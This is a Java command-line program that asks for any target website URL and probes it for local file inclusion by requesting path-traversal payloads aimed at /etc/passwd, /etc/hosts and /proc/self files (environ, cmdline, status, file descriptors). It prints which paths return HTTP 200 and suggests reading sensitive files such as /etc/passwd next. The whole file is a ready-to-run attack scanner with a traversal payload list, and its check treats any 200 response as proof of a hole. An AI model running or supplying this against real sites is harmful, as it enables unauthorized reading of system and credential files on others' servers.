import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class LFITest {

    public static void main(String[] args) {
        // Prompt user for target website URL
        System.out.print("Enter your target website url: ");
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
        String targetUrl = null;
        try {
            targetUrl = reader.readLine();
        } catch (IOException e) {
            e.printStackTrace();
        }

        if (targetUrl != null) {
            // Perform LFI test
            System.out.println("\nTesting for LFI vulnerability on: " + targetUrl);
            boolean vulnerable = testForLFI(targetUrl);

            // Display results
            if (vulnerable) {
                System.out.println("\n" + "\033[0;31m" + "The target website is vulnerable to LFI!" + "\033[0m");
                System.out.println("\nTo further test the vulnerability, try accessing sensitive files like /etc/passwd");
            } else {
                System.out.println("\n" + "\033[0;32m" + "The target website is not vulnerable to LFI." + "\033[0m");
            }
        }
    }

    private static boolean testForLFI(String targetUrl) {
        boolean vulnerable = false;
        List<String> pathsToTest = generatePathsToTest();

        try {
            for (String path : pathsToTest) {
                URL url = new URL(targetUrl + "/" + path);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                int responseCode = connection.getResponseCode();

                // Check if response code indicates success (file exists)
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    System.out.println("Found vulnerable path: " + url.toString());
                    vulnerable = true;
                }
            }
        } catch (IOException e) {
            // Ignore exceptions for simplicity
        }
        return vulnerable;
    }

    private static List<String> generatePathsToTest() {
        List<String> paths = new ArrayList<>();
        paths.add("../etc/passwd");
        paths.add("../etc/hosts");
        paths.add("../../../../../../../../../../../../../../etc/passwd");
        paths.add("../../../../../../../../../../../../../../etc/hosts");
        paths.add("../../../../../../../../../../../../../../proc/self/environ");
        paths.add("../../../../../../../../../../../../../../proc/self/cmdline");
        paths.add("../../../../../../../../../../../../../../proc/self/status");
        paths.add("../../../../../../../../../../../../../../proc/self/fd/0");
        paths.add("../../../../../../../../../../../../../../proc/self/fd/1");
        paths.add("../../../../../../../../../../../../../../proc/self/fd/2");
        paths.add("../../../../../../../../../../../../../../proc/self/fd/3");
        // Add more paths to test here
        return paths;
    }
}
